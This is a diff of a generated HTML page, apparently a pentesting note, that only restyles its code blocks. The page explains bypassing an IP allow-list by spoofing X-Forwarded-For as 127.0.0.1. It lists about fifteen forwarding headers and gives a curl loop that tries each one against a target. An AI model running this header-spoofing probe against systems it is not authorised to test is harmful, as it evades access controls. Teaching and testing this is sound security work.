@@ -42,6 +42,8 @@
       
     
     
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
     <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
@@ -879,42 +881,45 @@
 <p><code>IP not on Whitelist!</code></p>
 <p>(not a likely response but serves as an example)</p>
 <p>You'd then try and send the following request:</p>
-<pre><code class="language-bash">GET /login HTTP/1.1
-User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
-Host: bullsec.xyz
-Accept-Language: en-us
-Accept-Encoding: gzip, deflate
-Connection: Keep-Alive
-X-Forwarded-For: 127.0.0.1
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>GET<span style="color: #f8f8f2"> </span>/login<span style="color: #f8f8f2"> </span>HTTP/1.1
+User-Agent:<span style="color: #f8f8f2"> </span>Mozilla/4.0<span style="color: #f8f8f2"> </span><span style="color: #f92672">(</span>compatible<span style="color: #f8f8f2">; </span>MSIE5.01<span style="color: #f8f8f2">; </span>Windows<span style="color: #f8f8f2"> </span>NT<span style="color: #f92672">)</span>
+Host:<span style="color: #f8f8f2"> </span>bullsec.xyz
+Accept-Language:<span style="color: #f8f8f2"> </span>en-us
+Accept-Encoding:<span style="color: #f8f8f2"> </span>gzip,<span style="color: #f8f8f2"> </span>deflate
+Connection:<span style="color: #f8f8f2"> </span>Keep-Alive
+X-Forwarded-For:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+</code></pre></div>
+
 <blockquote>
 <p>That endpoint doesn't exist on this site this is not a lab.
 {: .prompt-warning}</p>
 </blockquote>
 <p>The idea is that the webserver will parse the <code>X-Forwarded-For</code> header and assume that the request has been forwarded to it on behalf of <code>127.0.0.1</code> / <code>localhost</code> and let you access the "Blocked" <code>/login</code> endpoint. </p>
 <h2 id="automation-block">Automation Block</h2>
-<pre><code class="language-bash">X-Forwarded: 127.0.0.1
-X-Forwarded-By: 127.0.0.1
-X-Forwarded-For: 127.0.0.1
-X-Forwarded-For-Original: 127.0.0.1
-X-Forwarder-For: 127.0.0.1
-X-Forward-For: 127.0.0.1
-Forwarded-For: 127.0.0.1
-Forwarded-For-Ip: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
-X-Originating-Ip: 127.0.0.1
-X-Remote-IP: 127.0.0.1
-X-Remote-Addr: 127.0.0.1
-X-Trusted-IP: 127.0.0.1
-X-Requested-By: 127.0.0.1
-X-Requested-For: 127.0.0.1
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>X-Forwarded:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Forwarded-By:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Forwarded-For:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Forwarded-For-Original:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Forwarder-For:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Forward-For:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+Forwarded-For:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+Forwarded-For-Ip:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Custom-IP-Authorization:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Originating-Ip:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Remote-IP:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Remote-Addr:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Trusted-IP:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Requested-By:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+X-Requested-For:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">127</span>.0.0.1
+</code></pre></div>
+
 <blockquote>
 <p>Copy the above into a text file</p>
 </blockquote>
-<pre><code class="language-bash">TARGET=&lt;target-ip-address&gt;
-for x in $(cat headers.txt);do curl -v $TARGET -H &quot;$x&quot; ; done
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #f8f8f2">TARGET</span><span style="color: #f92672">=</span>&lt;target-ip-address&gt;
+<span style="color: #66d9ef">for</span><span style="color: #f8f8f2"> </span>x<span style="color: #f8f8f2"> </span><span style="color: #66d9ef">in</span><span style="color: #f8f8f2"> </span><span style="color: #66d9ef">$(</span>cat<span style="color: #f8f8f2"> </span>headers.txt<span style="color: #66d9ef">)</span><span style="color: #f8f8f2">;</span><span style="color: #66d9ef">do</span><span style="color: #f8f8f2"> </span>curl<span style="color: #f8f8f2"> </span>-v<span style="color: #f8f8f2"> $TARGET </span>-H<span style="color: #f8f8f2"> </span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">$x</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2"> ; </span><span style="color: #66d9ef">done</span>
+</code></pre></div>
+
 <p>That's your lot.</p>
 <p>Enjoy,</p>
 
